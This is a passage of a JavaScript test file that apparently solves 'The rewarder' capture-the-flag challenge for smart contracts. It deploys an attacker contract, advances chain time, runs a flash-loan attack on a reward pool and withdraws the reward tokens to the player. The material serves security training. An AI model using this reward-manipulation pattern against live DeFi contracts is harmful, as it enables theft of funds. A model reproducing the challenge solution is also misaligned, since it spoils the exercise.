...
describe('[Challenge] The rewarder', function () {
    ...
    it('Execution', async function () {
        ...
        const TheRewarderAttacker = await ethers.getContractFactory('TheRewarderAttacker', deployer);
        const attacker = await TheRewarderAttacker.connect(player).deploy(rewarderPool.address);

        await ethers.provider.send("evm_increaseTime", [6 * 24 * 60 * 60]);
        await attacker.attack(flashLoanPool.address, TOKENS_IN_LENDER_POOL);
        await attacker.connect(player).withdraw(rewardToken.address);
    });
